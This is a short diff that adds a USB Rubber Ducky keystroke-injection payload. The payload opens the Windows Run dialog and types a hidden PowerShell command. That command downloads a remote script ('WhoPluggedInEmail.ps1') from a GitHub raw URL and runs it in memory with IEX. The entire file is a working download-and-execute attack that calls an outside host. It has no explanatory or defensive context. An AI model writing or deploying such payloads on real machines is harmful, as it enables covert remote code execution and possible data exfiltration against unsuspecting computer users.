@@ -1,0 +1,3 @@
+GUI r
+DELAY 300
+STRING powershell.exe -WindowStyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/WhoPluggedInEmail.ps1');"
